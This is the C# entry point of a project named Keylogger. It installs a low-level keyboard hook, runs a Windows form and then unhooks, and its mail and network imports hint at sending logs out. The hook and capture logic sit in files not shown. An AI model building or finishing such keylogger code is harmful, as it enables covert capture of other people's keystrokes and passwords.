using Keylogger.BLL;
using Keylogger.GUI;
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;
using Keylogger.DTO;

namespace Keylogger
{
    internal static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        /// 
        public static IntPtr hook = IntPtr.Zero;

        [STAThread]
        static void Main()
        {
            // To customize application configuration such as set high DPI settings or default font,
            // see https://aka.ms/applicationconfiguration.
            ApplicationConfiguration.Initialize();
            hook = SettingBLL.SetHook(SettingBLL.llkProcedure);

            Application.Run(new Form1());
            SettingBLL.UnhookWindowsHookEx(hook);
        }
    }
}